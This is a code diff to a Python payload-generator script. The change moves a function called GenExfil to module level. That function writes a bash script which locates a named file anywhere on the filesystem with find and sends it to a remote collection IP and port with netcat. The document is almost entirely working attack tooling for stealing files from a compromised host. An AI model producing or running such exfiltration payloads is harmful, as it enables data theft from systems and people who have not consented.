@@ -18,16 +18,17 @@ def main():
     if(args.payloadChoice == "exfil" ):
         GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
         print("Exfil Payload Generated! \n")
-        return
 
-    def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
-        ExfilPayloadText = "#!/bin/bash \n"
-        ExfilPayloadText += "EXFILPATH=$(find / -name '" + exfilFile + "' | grep " + exfilFile + ")\n"
-        ExfilPayloadText += "nc " + collectionIP + " " + collectionPort + " < $EXFILPATH \n"
-        f = open(payloadName, "w")
-        f.write(ExfilPayloadText)
-        f.close()
-        return
+    return
+
+def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
+    ExfilPayloadText = "#!/bin/bash \n"
+    ExfilPayloadText += "EXFILPATH=$(find / -name '" + exfilFile + "' | grep " + exfilFile + ")\n"
+    ExfilPayloadText += "nc " + collectionIP + " " + collectionPort + " < $EXFILPATH \n"
+    f = open(payloadName, "w")
+    f.write(ExfilPayloadText)
+    f.close()
+    return
 
 if __name__ == "__main__":
     main()
